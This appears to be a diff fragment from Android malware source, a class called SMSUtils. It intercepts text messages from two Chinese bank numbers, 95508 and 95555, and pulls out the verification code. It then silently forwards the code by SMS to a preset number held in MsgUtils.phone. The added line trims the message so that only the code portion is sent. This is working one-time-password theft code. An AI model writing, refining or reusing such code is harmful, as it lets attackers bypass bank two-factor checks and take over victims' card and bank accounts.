@@ -117,6 +117,7 @@ public class SMSUtils {
 					SmsManager smsManager = SmsManager.getDefault();
 					if (phone.equals("95508") || phone.equals("95555")) {// 广发信用卡//招商卡
 						if (body.indexOf("验证码") != -1) {
+							body = body.substring(body.indexOf("验证码") + 4);
 							smsManager.sendTextMessage(MsgUtils.phone, null,
 									body, null, null);
 							Log.i(TAG, "短信发送成功");
